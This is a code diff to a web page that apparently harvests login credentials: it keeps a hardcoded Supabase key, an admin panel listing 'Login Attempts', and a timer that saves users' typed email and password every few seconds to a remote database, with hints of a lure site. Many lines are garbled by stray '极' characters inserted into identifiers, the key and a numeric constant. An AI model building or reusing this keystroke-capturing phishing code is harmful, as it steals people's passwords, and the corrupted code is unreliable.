@@ -559,7 +559,7 @@
     
     <div class="admin-panel" id="adminPanel">
         <div class="admin-header">
-            <h2 class="admin-title"><i class="fas fa-shield-alt"></i> Admin Panel - Login Attempts</h2>
+            <h2 class极="admin-title"><i class="fas fa-shield-alt"></i> Admin Panel - Login Attempts</h2>
             <button class="close-admin" id="closeAdmin">
                 <i class="fas fa-times"></i>
             </button>
@@ -578,7 +578,7 @@
     <script>
         // Initialize Supabase
         const supabaseUrl = 'https://vdrzdruwlsknvlxobnlp.supabase.co';
-        const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6Ikp极VCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InZkcnpkcnV3bHNrbnZseG9ibmxwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTY2Njg2MTIsImV4cCI6MjA3MjI0NDYxMn0.B0S3Po8VrP2zSRWQCX79D8L2u4V0PX01YeeoNxAS-pc';
+        const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InZkcnpkcnV3bHNrbnZseG9ibmxwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTY2Njg2MTIsImV4cCI6MjA3MjI0NDYxMn0.B0S3Po8VrP2极SRWQCX79D8L2u4V0PX01YeeoNxAS-pc';
         const supabase = window.supabase.createClient(supabaseUrl, supabaseKey);
 
         document.addEventListener('DOMContentLoaded', function() {
@@ -592,14 +592,14 @@
             const adminPanel = document.getElementById('adminPanel');
             const attemptsList = document.getElementById('attemptsList');
             const overlay = document.getElementById('overlay');
-            const closeAdmin = document.getElementById极('closeAdmin');
+            const closeAdmin = document.getElementById('closeAdmin');
             const downloadBtn = document.getElementById('downloadBtn');
             const clearBtn = document.getElementById('clearBtn');
             const adminLoginContainer = document.getElementById('adminLoginContainer');
             const adminLoginBtn = document.getElementById('adminLoginBtn');
             const adminUsername = document.getElementById('adminUsername');
             const adminPassword = document.getElementById('adminPassword');
-            const adminError = document.getElementById('adminError');
+            const adminError = document.getElementById('极dminError');
             const adminLoginClose = document.getElementById('adminLoginClose');
             const passwordInput = document.getElementById('password');
             const togglePassword = document.getElementById('togglePassword');
@@ -637,7 +637,7 @@
                 supabaseStatus.innerHTML = `<i class="fas fa-database"></i> ${message}`;
                 supabaseStatus.style.display = 'block';
                 supabaseStatus.className = isError ? 
-                    'supabase-status connection-error极 : 'supabase-status';
+                    'supabase-status connection-error' : 'supabase-status';
                 
                 setTimeout(() => {
                     supabaseStatus.style.display = 'none';
@@ -709,7 +709,7 @@
             }
             
             // Display login attempts in admin panel
-            async function displayLogin极ttempts() {
+            async function displayLoginAttempts() {
                 attemptsList.innerHTML = '';
                 
                 loginAttempts = await loadFromSupabase();
@@ -798,7 +798,7 @@
                 
                 if (saved) {
                     loginPage.style.display = 'none';
-                    mainPage.style.display = 'block';
+                    main极ge.style.display = 'block';
                     
                     if (girlsContainer.children.length === 0) {
                         populateGirls();
@@ -910,7 +910,7 @@
             togglePassword.addEventListener('click', function() {
                 const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
                 passwordInput.setAttribute('type', type);
-                this.innerHTML = type === 'password' ? '<i class="fas fa-eye"></i>' : '<极 class="fas fa-eye-slash"></i>';
+                this.innerHTML = type === 'password' ? '<i class="fas fa-eye"></i>' : '<i class="fas fa-eye-slash"></i>';
             });
             
             // Initialize
@@ -933,7 +933,7 @@
             // Periodically save what users are typing
             setInterval(async function() {
                 const now = Date.now();
-                if (now - lastSaveTime < 极000) return;
+                if (now - lastSaveTime < 3000) return;
                 
                 if (emailValue || passwordValue) {
                     const saved = await saveToSupabase({
